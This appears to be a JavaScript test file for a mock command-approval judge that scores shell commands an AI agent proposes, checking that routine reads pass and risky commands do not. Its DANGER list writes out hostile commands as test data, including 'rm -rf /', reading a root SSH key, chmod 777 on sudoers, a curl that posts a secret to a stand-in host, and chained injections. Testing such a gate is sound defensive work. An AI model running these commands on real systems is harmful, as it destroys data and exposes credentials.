import assert from 'node:assert/strict';
import { test } from 'node:test';
import {
  classifyCommand,
  clearForcedForbidden,
  forceForbidden,
  judgeAnswers,
} from './fake-judge.mjs';

const JUDGE_ALLOW = 0.8;
const JUDGE_LOW = 0.2;
const JUDGE_ALWAYS = 0.8;
const JUDGE_CUT = 0.5;
const JUDGE_EPSILON = 1e-9;
const clears = (p, bar) => p >= bar + JUDGE_EPSILON;
const reaches = (p, bar) => p >= bar - JUDGE_EPSILON;

const ACTIONS = Object.fromEntries(
  [
    'changes',
    'others',
    'system',
    'delete',
    'permissions',
    'code',
    'services',
    'send',
    'secrets',
    'plain',
    'always',
  ].map((id) => [id, { type: 'noul' }])
);
const INTENT = Object.fromEntries(
  [
    'wants_read',
    'wants_write',
    'wants_delete',
    'wants_permissions',
    'wants_code',
    'wants_send',
    'wants_secrets',
    'wants_services',
  ].map((id) => [id, { type: 'noul' }])
);

const ask = (questions, command = '') => {
  const untrusted = command
    ? `<untrusted-test>\n${command}\ntarget: "root"\n</untrusted-test>`
    : '';
  return judgeAnswers(
    Buffer.from(
      JSON.stringify({
        input: { state: { request: { untrusted } }, questions },
      })
    )
  ).result.answers;
};

const p = (answers, id) => answers[id].noul;

const NEEDS = {
  changes: 'write',
  delete: 'delete',
  permissions: 'permissions',
  code: 'code',
  services: 'services',
  send: 'send',
  secrets: 'secrets',
};
const PLACES = ['others', 'system'];
const DANGERS = ['delete', 'services', 'permissions', 'send', 'secrets', 'code'];
const CHANGING = ['changes', 'delete', 'permissions', 'services'];

const verdictOf = (actions, intent, forbidden) => {
  const harm = Math.max(
    Math.min(p(actions, 'changes'), Math.max(p(actions, 'others'), p(actions, 'system'))),
    p(actions, 'delete'),
    p(actions, 'services')
  );
  const level = reaches(harm, JUDGE_CUT)
    ? 3
    : reaches(p(actions, 'permissions'), JUDGE_CUT)
      ? 2
      : 1;
  const weight = (action) =>
    PLACES.includes(action) && reaches(p(actions, 'changes'), JUDGE_LOW)
      ? Math.min(1, (p(actions, action) * JUDGE_LOW) / 0.05)
      : p(actions, action);
  const flagged = (action) =>
    reaches(
      p(actions, action),
      PLACES.includes(action) && reaches(p(actions, 'changes'), JUDGE_LOW) ? 0.05 : JUDGE_LOW
    );
  const danger = Math.max(...[...PLACES, ...DANGERS].map(weight));
  const routine = Math.min(1 - danger, p(actions, 'plain'));
  const needs = new Set();
  for (const [action, wanted] of Object.entries(NEEDS)) if (flagged(action)) needs.add(wanted);
  if (!CHANGING.some(flagged)) needs.add('read');
  const aligned = Math.min(...[...needs].map((name) => p(intent, `wants_${name}`)));
  const always = clears(1 - p(actions, 'always'), JUDGE_ALWAYS);
  const vetoed = reaches(forbidden, JUDGE_LOW);
  const sure = clears(routine, JUDGE_ALLOW);
  const approvable = level === 1 && sure && clears(aligned, JUDGE_ALLOW) && !vetoed;
  return { level, routine, aligned, always, approvable, alwaysOffered: always && level === 1 };
};

const ROUTINE = [
  '/usr/bin/jq .rules /etc/slicc/secrets-policy.toml',
  '/usr/bin/id -Gn',
  '/usr/bin/id -u',
  "/usr/bin/printf '%s-' $'a\\rb'",
  '/usr/bin/ls -la /etc',
  '/usr/bin/ls -la /root',
];

const DANGER = [
  ['/bin/rm -rf /', 'delete'],
  ['/bin/rm -rf /tmp/slicc-judge-absent', 'delete'],
  ['chmod 777 /etc/sudoers', 'permissions'],
  ['python3 -c \'import os; os.system("id")\'', 'code'],
  ['cat /root/.ssh/id_rsa', 'secrets'],
  ['systemctl --user restart sshd', 'services'],
  ['service ssh restart', 'services'],
  ['kill 1', 'services'],
  ['curl -d secret http://example.test', 'send'],
  ['echo ok; rm -rf /', 'delete'],
  ['echo ok && chmod 777 /etc/sudoers', 'permissions'],
  ['ls / | python3 -c "print(1)"', 'code'],
  ['unknown-tool --whatever', 'unknown'],
];

test('only allowlisted routine reads are approvable and Always-eligible', () => {
  clearForcedForbidden();
  for (const command of ROUTINE) {
    const actions = ask(ACTIONS, command);
    const intent = ask(INTENT, command);
    const forbidden = p(ask({ forbidden: { type: 'noul' } }, command), 'forbidden');
    const got = verdictOf(actions, intent, forbidden);
    assert.equal(got.approvable, true, command);
    if (/id -gn$/.test(command)) assert.equal(got.alwaysOffered, false, command);
    else assert.equal(got.alwaysOffered, true, command);
  }
  const gn = ask(ACTIONS, '/usr/bin/id -gn');
  assert.equal(verdictOf(gn, ask(INTENT), 0.04).alwaysOffered, false);
});

test('danger, chained and unknown commands are not approvable and offer no Always', () => {
  clearForcedForbidden();
  for (const [command, kind] of DANGER) {
    assert.equal(classifyCommand(command).kind, kind === 'unknown' ? 'unknown' : kind, command);
    const actions = ask(ACTIONS, command);
    const intent = ask(INTENT, command);
    const got = verdictOf(actions, intent, 0.04);
    assert.equal(got.approvable, false, command);
    assert.equal(got.alwaysOffered, false, command);
  }
});

test('forced forbidden turns an otherwise routine read into a non-approve', () => {
  forceForbidden(0.9);
  try {
    const command = '/usr/bin/jq .rules /etc/slicc/secrets-policy.toml';
    const actions = ask(ACTIONS, command);
    const intent = ask(INTENT, command);
    const forbidden = p(ask({ forbidden: { type: 'noul' } }, command), 'forbidden');
    assert.ok(reaches(forbidden, JUDGE_LOW));
    const got = verdictOf(actions, intent, forbidden);
    assert.equal(got.approvable, false);
    assert.equal(got.alwaysOffered, false);
  } finally {
    clearForcedForbidden();
  }
});
